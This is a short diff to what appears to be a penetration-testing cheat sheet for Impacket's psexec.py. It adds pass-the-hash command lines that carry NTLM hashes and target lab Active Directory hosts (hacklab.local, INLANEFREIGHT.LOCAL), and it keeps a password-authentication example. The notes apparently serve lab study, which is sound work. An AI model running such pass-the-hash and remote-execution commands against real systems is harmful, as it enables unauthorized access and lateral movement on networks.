@@ -21,7 +21,8 @@ Tip: use $(pwd) for the current working  directory
 ```
 [Sample Usage] python3 psexec.py Administrator@10.10.10.10 (enter password when prompted)
 [PWD Auth] python3 psexec.py hacklab.local/ADLab02:P@ssw0rd123@192.168.10.17
-[PTH] python3 psexec.py Administrator@192.168.10.17 -hashes "aad3b435b51404eeaad3b435b51404ee:58f5081696f366cdc72491a2c4996bd5"
+[PTH] psexec.py Administrator@192.168.10.17 -hashes "aad3b435b51404eeaad3b435b51404ee:58f5081696f366cdc72491a2c4996bd5"
+[PTH] psexec.py INLANEFREIGHT.LOCAL/Administrator@172.16.5.5 -hashes "aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf"
 ```
 
 ## SMBExec
